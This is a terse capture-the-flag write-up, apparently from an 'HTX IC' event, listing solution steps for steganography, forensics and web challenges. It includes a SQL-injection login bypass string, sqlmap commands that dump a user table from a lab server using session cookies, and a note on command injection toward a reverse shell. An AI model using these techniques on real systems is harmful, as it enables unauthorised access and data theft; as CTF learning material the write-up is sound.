# Very Brief HTX IC Writeup

Had to explore game world
Interesting concept but hard to do in camp

A01
1. Remove first few bytes which have the password
2. Extract the files using the password (zip file?)
3. Extract tiff file from jpg?

A07
1. From dirb common.txt, create a SHA256 wordlist
2. Use dirb and that wordlist to brute force the website - Gives you forum, manual, home, login
3. Looking at Forum posts, notice there is not post1
4. Source code of that forum webpage suggests that you can get the url for post1 using
5. Leaked post1 gives admin password
6. Login using admin password to get flag

A12
1. Frequency Analyser for wav file

A19
1. Analyse the photo using some online analyser. Fiddle with some settings to make the unordinary pixels stand out
2. Google for the animal's full name. Flag is that but lower case

A20
1. Look through the video frame by frame

C74
1. Login using `' OR 1=1 #` bypass
2. You get the flag

C75-76
1. Log in to page, and get the cookie
2. Use sqlmap to crawl - Get time based injection ` sqlmap --cookie "PHPSESSID=j7giuk6crbm5gnjkn6n49qu5e5" -u http://10.8.201.73/HTXIC/tenant/services.php --forms`
3. Can get version using this: `sqlmap --cookie "PHPSESSID=tel2plf0qj23t9m0u3oboc6qn2" -u http://10.8.201.73/HTXIC/tenant/services.php --forms --sql-query "select version();"`
4. Can get tables using this: ` --tables`
5. Can get data using this `sqlmap --cookie "PHPSESSID=j7giuk6crbm5gnjkn6n49qu5e5" -u http://10.8.201.73/HTXIC/tenant/services.php --forms -D htx -T user --dump `


## Not Solved but other solutions

C70
1. Not sure how but command injection in `/cmd.php`
2. Custom payload for rev shell?
